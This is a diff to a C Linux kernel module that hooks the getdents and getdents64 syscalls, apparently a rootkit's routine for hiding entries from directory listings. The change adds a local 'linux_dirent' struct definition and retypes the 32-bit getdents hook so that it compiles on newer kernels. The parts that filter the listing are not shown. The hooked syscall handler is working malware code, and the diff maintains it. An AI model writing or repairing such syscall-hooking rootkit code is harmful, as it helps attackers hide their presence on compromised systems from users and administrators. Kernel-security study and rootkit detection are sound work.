@@ -111,13 +111,22 @@ done:
 /* This is our hook for sys_getdetdents */
 asmlinkage int hook_getdents(const struct pt_regs *regs)
 {
+    /* The linux_dirent struct got removed from the kernel headers so we have to
+     * declare it ourselves */
+    struct linux_dirent {
+        unsigned long d_ino;
+        unsigned long d_off;
+        unsigned short d_reclen;
+        char d_name[];
+    };
+
     /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
     // int fd = regs->di;
-    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
     // int count = regs->dx;
 
     /* We will need these intermediate structures for looping through the directory listing */
-    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
     unsigned long offset = 0;
 
     /* We first have to actually call the real sys_getdents syscall and save it so that we can
@@ -185,7 +194,7 @@ done:
 }
 #else
 static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
-static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
+static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
 
 static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
 {
